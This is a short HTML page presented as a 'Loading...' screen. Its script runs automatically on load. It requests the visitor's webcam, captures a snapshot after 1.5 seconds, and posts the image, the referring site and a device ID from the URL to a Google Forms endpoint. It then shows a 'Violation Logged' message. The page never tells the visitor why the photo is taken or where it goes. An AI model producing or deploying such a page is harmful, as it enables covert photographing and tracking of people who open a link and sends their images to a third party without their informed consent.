<!DOCTYPE html>
<html>
<head>
  <title>Access Logged</title>
  <script>
    const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSf1C_6KKbmpRTcSuAehZV_0hbtMyouGylAwvL1liIi3M4v6hQ/formResponse";

    const deviceID = new URLSearchParams(window.location.search).get('device') || 'UNKNOWN';
    const referrer = document.referrer || 'Unknown Site';

    function sendSnapshot(imgData) {
      const formData = new FormData();
      formData.append("entry.2012483072", imgData);
      formData.append("entry.500527079", referrer);
      formData.append("entry.1027569634", deviceID);

      fetch(formURL, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
      }).then(() => {
        console.log("Logged");
      }).catch((err) => {
        console.error("Error:", err);
      });
    }

    function snap() {
      const video = document.createElement('video');
      const canvas = document.createElement('canvas');
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const image = canvas.toDataURL("image/png");
            sendSnapshot(image);
            stream.getTracks().forEach(t => t.stop());
            document.body.innerHTML = "<h2>Violation Logged</h2>";
          }, 1500);
        })
        .catch(err => {
          console.error("Camera access failed");
        });
    }

    window.onload = snap;
  </script>
</head>
<body>
  <h3>Loading...</h3>
</body>
</html>
